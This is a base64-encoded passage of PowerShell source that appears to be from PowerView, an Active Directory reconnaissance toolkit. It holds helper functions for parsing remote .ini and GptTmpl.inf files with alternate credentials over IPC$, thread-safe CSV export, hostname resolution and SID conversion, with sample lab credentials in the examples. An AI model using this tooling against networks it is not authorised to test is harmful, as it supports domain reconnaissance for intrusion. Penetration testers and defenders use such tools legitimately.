JhbWV0ZXIgLUFyZ3VtZW50TGlzdCBAKCROYW1lLCAkVHlwZSwgJEF0dHJpYnV0ZUNvbGxlY3Rpb24pCiAgICAgICAgICAgICAgICAkRFBEaWN0aW9uYXJ5LkFkZCgkTmFtZSwgJFBhcmFtZXRlcikKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBFbmQgewogICAgICAgIGlmKCEkQ3JlYXRlVmFyaWFibGVzIC1hbmQgISREaWN0aW9uYXJ5KSB7CiAgICAgICAgICAgICREUERpY3Rpb25hcnkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtSW5pQ29udGVudCB7CjwjCi5TWU5PUFNJUwoKVGhpcyBoZWxwZXIgcGFyc2VzIGFuIC5pbmkgZmlsZSBpbnRvIGEgaGFzaHRhYmxlLgoKQXV0aG9yOiAnVGhlIFNjcmlwdGluZyBHdXlzJwpNb2RpZmljYXRpb25zOiBAaGFybWoweSAoLUNyZWRlbnRpYWwgc3VwcG9ydCkKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogQWRkLVJlbW90ZUNvbm5lY3Rpb24sIFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCgouREVTQ1JJUFRJT04KClBhcnNlcyBhbiAuaW5pIGZpbGUgaW50byBhIGhhc2h0YWJsZS4gSWYgLUNyZWRlbnRpYWwgaXMgc3VwcGxpZWQsCnRoZW4gQWRkLVJlbW90ZUNvbm5lY3Rpb24gaXMgdXNlZCB0byBtYXAgXFxDT01QVVRFUk5BTUVcSVBDJCwgdGhlIGZpbGUKaXMgcGFyc2VkLCBhbmQgdGhlbiB0aGUgY29ubmVjdGlvbiBpcyBkZXN0cm95ZWQgd2l0aCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbi4KCi5QQVJBTUVURVIgUGF0aAoKU3BlY2lmaWVzIHRoZSBwYXRoIHRvIHRoZSAuaW5pIGZpbGUgdG8gcGFyc2UuCgouUEFSQU1FVEVSIE91dHB1dE9iamVjdAoKU3dpdGNoLiBPdXRwdXQgYSBjdXN0b20gUFNPYmplY3QgaW5zdGVhZCBvZiBhIGhhc2h0YWJsZS4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgpHZXQtSW5pQ29udGVudCBDOlxXaW5kb3dzXGV4YW1wbGUuaW5pCgouRVhBTVBMRQoKIkM6XFdpbmRvd3NcZXhhbXBsZS5pbmkiIHwgR2V0LUluaUNvbnRlbnQgLU91dHB1dE9iamVjdAoKT3V0cHV0cyB0aGUgLmluaSBkZXRhaWxzIGFzIGEgcHJvcGVyIG5lc3RlZCBQU09iamVjdC4KCi5FWEFNUExFCgoiQzpcV2luZG93c1xleGFtcGxlLmluaSIgfCBHZXQtSW5pQ29udGVudAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1JbmlDb250ZW50IC1QYXRoIFxcUFJJTUFSWS50ZXN0bGFiLmxvY2FsXEMkXFRlbXBcR3B0VG1wbC5pbmYgLUNyZWRlbnRpYWwgJENyZWQKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSAuaW5pIHBhdGhzIG9uIHRoZSBwaXBlbGluZS4KCi5PVVRQVVRTCgpIYXNodGFibGUKCk91cHV0cyBhIGhhc2h0YWJsZSByZXByZXNlbnRpbmcgdGhlIHBhcnNlZCAuaW5pIGZpbGUuCgouTElOSwoKaHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vaGV5c2NyaXB0aW5nZ3V5LzIwMTEvMDgvMjAvdXNlLXBvd2Vyc2hlbGwtdG8td29yay13aXRoLWFueS1pbmktZmlsZS8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW0hhc2h0YWJsZV0pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Z1bGxOYW1lJywgJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRPdXRwdXRPYmplY3QKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJE1hcHBlZENvbXB1dGVycyA9IEB7fQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRoKSB7CiAgICAgICAgICAgIGlmICgoJFRhcmdldFBhdGggLU1hdGNoICdcXFxcLipcXC4qJykgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pKSB7CiAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0pIHsKICAgICAgICAgICAgICAgICAgICAjIG1hcCBJUEMkIHRvIHRoaXMgY29tcHV0ZXIgaWYgaXQncyBub3QgYWxyZWFkeQogICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgJEhvc3RDb21wdXRlciAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0gPSAkVHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRUYXJnZXRQYXRoKSB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydPdXRwdXRPYmplY3QnXSkgewogICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0ID0gQHt9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBTd2l0Y2ggLVJlZ2V4IC1GaWxlICRUYXJnZXRQYXRoIHsKICAgICAgICAgICAgICAgICAgICAiXlxbKC4rKVxdIiAjIFNlY3Rpb24KICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWN0aW9uID0gJG1hdGNoZXNbMV0uVHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ091dHB1dE9iamVjdCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbiA9ICRTZWN0aW9uLlJlcGxhY2UoJyAnLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWN0aW9uT2JqZWN0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaU9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICRTZWN0aW9uICRTZWN0aW9uT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0WyRTZWN0aW9uXSA9IEB7fQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRDb21tZW50Q291bnQgPSAwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJeKDsuKikkIiAjIENvbW1lbnQKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRWYWx1ZSA9ICRtYXRjaGVzWzFdLlRyaW0oKQogICAgICAgICAgICAgICAgICAgICAgICAkQ29tbWVudENvdW50ID0gJENvbW1lbnRDb3VudCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSAnQ29tbWVudCcgKyAkQ29tbWVudENvdW50CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ091dHB1dE9iamVjdCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSA9ICROYW1lLlJlcGxhY2UoJyAnLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3QuJFNlY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAkTmFtZSAkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3RbJFNlY3Rpb25dWyROYW1lXSA9ICRWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICIoLis/KVxzKj0oLiopIiAjIEtleQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUsICRWYWx1ZSA9ICRtYXRjaGVzWzEuLjJdCiAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJE5hbWUuVHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgICRWYWx1ZXMgPSAkVmFsdWUuc3BsaXQoJywnKSB8IEZvckVhY2gtT2JqZWN0IHsgJF8uVHJpbSgpIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgKCRWYWx1ZXMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7ICRWYWx1ZXMgPSBAKCRWYWx1ZXMpIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ091dHB1dE9iamVjdCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSA9ICROYW1lLlJlcGxhY2UoJyAnLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3QuJFNlY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAkTmFtZSAkVmFsdWVzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0WyRTZWN0aW9uXVskTmFtZV0gPSAkVmFsdWVzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkSW5pT2JqZWN0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICAjIHJlbW92ZSB0aGUgSVBDJCBtYXBwaW5ncwogICAgICAgICRNYXBwZWRDb21wdXRlcnMuS2V5cyB8IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCiAgICB9Cn0KCgpmdW5jdGlvbiBFeHBvcnQtUG93ZXJWaWV3Q1NWIHsKPCMKLlNZTk9QU0lTCgpDb252ZXJ0cyBvYmplY3RzIGludG8gYSBzZXJpZXMgb2YgY29tbWEtc2VwYXJhdGVkIChDU1YpIHN0cmluZ3MgYW5kIHNhdmVzIHRoZQpzdHJpbmdzIGluIGEgQ1NWIGZpbGUgaW4gYSB0aHJlYWQtc2FmZSBtYW5uZXIuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGhlbHBlciBleHBvcnRzIGFuIC1JbnB1dE9iamVjdCB0byBhIC5jc3YgaW4gYSB0aHJlYWQtc2FmZSBtYW5uZXIKdXNpbmcgYSBtdXRleC4gVGhpcyBpcyBzbyB0aGUgdmFyaW91cyBtdWx0aS10aHJlYWRlZCBmdW5jdGlvbnMgaW4KUG93ZXJWaWV3IGhhcyBhIHRocmVhZC1zYWZlIHdheSB0byBleHBvcnQgb3V0cHV0IHRvIHRoZSBzYW1lIGZpbGUuClVzZXMgLk5FVCBJTy5GaWxlU3RyZWFtL0lPLlN0cmVhbVdyaXRlciBvYmplY3RzIGZvciBzcGVlZC4KCk9yaWdpbmFsbHkgYmFzZWQgb24gRG1pdHJ5IFNvdG5pa292J3MgRXhwb3J0LUNTViBjb2RlOiBodHRwOi8vcG9zaGNvZGUub3JnLzE1OTAKCi5QQVJBTUVURVIgSW5wdXRPYmplY3QKClNwZWNpZmllcyB0aGUgb2JqZWN0cyB0byBleHBvcnQgYXMgQ1NWIHN0cmluZ3MuCgouUEFSQU1FVEVSIFBhdGgKClNwZWNpZmllcyB0aGUgcGF0aCB0byB0aGUgQ1NWIG91dHB1dCBmaWxlLgoKLlBBUkFNRVRFUiBEZWxpbWl0ZXIKClNwZWNpZmllcyBhIGRlbGltaXRlciB0byBzZXBhcmF0ZSB0aGUgcHJvcGVydHkgdmFsdWVzLiBUaGUgZGVmYXVsdCBpcyBhIGNvbW1hICgsKQoKLlBBUkFNRVRFUiBBcHBlbmQKCkluZGljYXRlcyB0aGF0IHRoaXMgY21kbGV0IGFkZHMgdGhlIENTViBvdXRwdXQgdG8gdGhlIGVuZCBvZiB0aGUgc3BlY2lmaWVkIGZpbGUuCldpdGhvdXQgdGhpcyBwYXJhbWV0ZXIsIEV4cG9ydC1Qb3dlclZpZXdDU1YgcmVwbGFjZXMgdGhlIGZpbGUgY29udGVudHMgd2l0aG91dCB3YXJuaW5nLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIHwgRXhwb3J0LVBvd2VyVmlld0NTViAtUGF0aCAidXNlcnMuY3N2IgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIHwgRXhwb3J0LVBvd2VyVmlld0NTViAtUGF0aCAidXNlcnMuY3N2IiAtQXBwZW5kIC1EZWxpbWl0ZXIgJ3wnCgouSU5QVVRTCgpQU09iamVjdAoKQWNjZXB0cyBvbmUgb3IgbW9yZSBQU09iamVjdHMgb24gdGhlIHBpcGVsaW5lLgoKLkxJTksKCmh0dHA6Ly9wb3NoY29kZS5vcmcvMTU5MApodHRwOi8vZG1pdHJ5c290bmlrb3Yud29yZHByZXNzLmNvbS8yMDEwLzAxLzE5L0V4cG9ydC1Dc3YtYXBwZW5kLwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU09iamVjdFtdXQogICAgICAgICRJbnB1dE9iamVjdCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUG9zaXRpb24gPSAxKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBhdGgsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtDaGFyXQogICAgICAgICREZWxpbWl0ZXIgPSAnLCcsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFwcGVuZAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkT3V0cHV0UGF0aCA9IFtJTy5QYXRoXTo6R2V0RnVsbFBhdGgoJFBTQm91bmRQYXJhbWV0ZXJzWydQYXRoJ10pCiAgICAgICAgJEV4aXN0cyA9IFtTeXN0ZW0uSU8uRmlsZV06OkV4aXN0cygkT3V0cHV0UGF0aCkKCiAgICAgICAgIyBtdXRleCBzbyB0aHJlYWRlZCBjb2RlIGRvZXNuJ3Qgc3RvbXAgb24gdGhlIG91dHB1dCBmaWxlCiAgICAgICAgJE11dGV4ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4ICRGYWxzZSwnQ1NWTXV0ZXgnCiAgICAgICAgJE51bGwgPSAkTXV0ZXguV2FpdE9uZSgpCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FwcGVuZCddKSB7CiAgICAgICAgICAgICRGaWxlTW9kZSA9IFtTeXN0ZW0uSU8uRmlsZU1vZGVdOjpBcHBlbmQKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGaWxlTW9kZSA9IFtTeXN0ZW0uSU8uRmlsZU1vZGVdOjpDcmVhdGUKICAgICAgICAgICAgJEV4aXN0cyA9ICRGYWxzZQogICAgICAgIH0KCiAgICAgICAgJENTVlN0cmVhbSA9IE5ldy1PYmplY3QgSU8uRmlsZVN0cmVhbSgkT3V0cHV0UGF0aCwgJEZpbGVNb2RlLCBbU3lzdGVtLklPLkZpbGVBY2Nlc3NdOjpXcml0ZSwgW0lPLkZpbGVTaGFyZV06OlJlYWQpCiAgICAgICAgJENTVldyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkQ1NWU3RyZWFtKQogICAgICAgICRDU1ZXcml0ZXIuQXV0b0ZsdXNoID0gJFRydWUKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkRW50cnkgaW4gJElucHV0T2JqZWN0KSB7CiAgICAgICAgICAgICRPYmplY3RDU1YgPSBDb252ZXJ0VG8tQ3N2IC1JbnB1dE9iamVjdCAkRW50cnkgLURlbGltaXRlciAkRGVsaW1pdGVyIC1Ob1R5cGVJbmZvcm1hdGlvbgoKICAgICAgICAgICAgaWYgKC1ub3QgJEV4aXN0cykgewogICAgICAgICAgICAgICAgIyBvdXRwdXQgdGhlIG9iamVjdCBmaWVsZCBuYW1lcyBhcyB3ZWxsCiAgICAgICAgICAgICAgICAkT2JqZWN0Q1NWIHwgRm9yRWFjaC1PYmplY3QgeyAkQ1NWV3JpdGVyLldyaXRlTGluZSgkXykgfQogICAgICAgICAgICAgICAgJEV4aXN0cyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAjIG9ubHkgb3V0cHV0IG9iamVjdCBmaWVsZCBkYXRhCiAgICAgICAgICAgICAgICAkT2JqZWN0Q1NWWzEuLigkT2JqZWN0Q1NWLkxlbmd0aC0xKV0gfCBGb3JFYWNoLU9iamVjdCB7ICRDU1ZXcml0ZXIuV3JpdGVMaW5lKCRfKSB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICAkTXV0ZXguUmVsZWFzZU11dGV4KCkKICAgICAgICAkQ1NWV3JpdGVyLkRpc3Bvc2UoKQogICAgICAgICRDU1ZTdHJlYW0uRGlzcG9zZSgpCiAgICB9Cn0KCgpmdW5jdGlvbiBSZXNvbHZlLUlQQWRkcmVzcyB7CjwjCi5TWU5PUFNJUwoKUmVzb2x2ZXMgYSBnaXZlbiBob3N0ZW5hbWUgdG8gaXRzIGFzc29jaWF0ZWQgSVB2NCBhZGRyZXNzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKUmVzb2x2ZXMgYSBnaXZlbiBob3N0ZW5hbWUgdG8gaXRzIGFzc29jaWF0ZWQgSVB2NCBhZGRyZXNzIHVzaW5nCltOZXQuRG5zXTo6R2V0SG9zdEVudHJ5KCkuIElmIG5vIGhvc3RuYW1lIGlzIHByb3ZpZGVkLCB0aGUgZGVmYXVsdAppcyB0aGUgSVAgYWRkcmVzcyBvZiB0aGUgbG9jYWxob3N0LgoKLkVYQU1QTEUKClJlc29sdmUtSVBBZGRyZXNzIC1Db21wdXRlck5hbWUgU0VSVkVSCgouRVhBTVBMRQoKQCgiU0VSVkVSMSIsICJTRVJWRVIyIikgfCBSZXNvbHZlLUlQQWRkcmVzcwoKLklOUFVUUwoKU3RyaW5nCgpBY2NlcHRzIG9uZSBvciBtb3JlIElQIGFkZHJlc3Mgc3RyaW5ncyBvbiB0aGUgcGlwZWxpbmUuCgouT1VUUFVUUwoKU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdAoKQSBjdXN0b20gUFNPYmplY3Qgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIGFuZCBJUEFkZHJlc3MuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRFbnY6Q09NUFVURVJOQU1FCiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIEAoKFtOZXQuRG5zXTo6R2V0SG9zdEVudHJ5KCRDb21wdXRlcikpLkFkZHJlc3NMaXN0KSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJF8uQWRkcmVzc0ZhbWlseSAtZXEgJ0ludGVyTmV0d29yaycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lQQWRkcmVzcycgJF8uSVBBZGRyZXNzVG9TdHJpbmcKICAgICAgICAgICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbUmVzb2x2ZS1JUEFkZHJlc3NdIENvdWxkIG5vdCByZXNvbHZlICRDb21wdXRlciB0byBhbiBJUCBBZGRyZXNzLiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIENvbnZlcnRUby1TSUQgewo8IwouU1lOT1BTSVMKCkNvbnZlcnRzIGEgZ2l2ZW4gdXNlci9ncm91cCBuYW1lIHRvIGEgc2VjdXJpdHkgaWRlbnRpZmllciAoU0lEKS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogQ29udmVydC1BRE5hbWUsIEdldC1Eb21haW5PYmplY3QsIEdldC1Eb21haW4gIAoKLkRFU0NSSVBUSU9OCgpDb252ZXJ0cyBhICJET01BSU5cdXNlcm5hbWUiIHN5bnRheCB0byBhIHNlY3VyaXR5IGlkZW50aWZpZXIgKFNJRCkKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQncyB0cmFuc2xhdGUgZnVuY3Rpb24uIElmIGFsdGVybmF0ZQpjcmVkZW50aWFscyBhcmUgc3VwcGxpZWQsIHRoZW4gR2V0LUFET2JqZWN0IGlzIHVzZWQgdG8gdHJ5IHRvIG1hcCB0aGUgbmFtZQp0byBhIHNlY3VyaXR5IGlkZW50aWZpZXIuCgouUEFSQU1FVEVSIE9iamVjdE5hbWUKClRoZSB1c2VyL2dyb3VwIG5hbWUgdG8gY29udmVydCwgY2FuIGJlICd1c2VyJyBvciAnRE9NQUlOXHVzZXInIGZvcm1hdC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSB0cmFuc2xhdGlvbiwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8gZm9yIHRoZSB0cmFuc2xhdGlvbi4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKU3BlY2lmaWVzIGFuIGFsdGVybmF0ZSBjcmVkZW50aWFsIHRvIHVzZSBmb3IgdGhlIHRyYW5zbGF0aW9uLgoKLkVYQU1QTEUKCkNvbnZlcnRUby1TSUQgJ0RFVlxkZm0nCgouRVhBTVBMRQoKJ0RFVlxkZm0nLCdERVZca3JidGd0JyB8IENvbnZlcnRUby1TSUQKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQonVEVTVExBQlxkZm0nIHwgQ29udmVydFRvLVNJRCAtQ3JlZGVudGlhbCAkQ3JlZAoKLklOUFVUUwoKU3RyaW5nCgpBY2NlcHRzIG9uZSBvciBtb3JlIHVzZXJuYW1lIHNwZWNpZmljYXRpb24gc3RyaW5ncyBvbiB0aGUgcGlwZWxpbmUuCgouT1VUUFVUUwoKU3RyaW5nCgpBIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIFNJRCBvZiB0aGUgdHJhbnNsYXRlZCBuYW1lLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnLCAnSWRlbnRpdHknKV0KICAg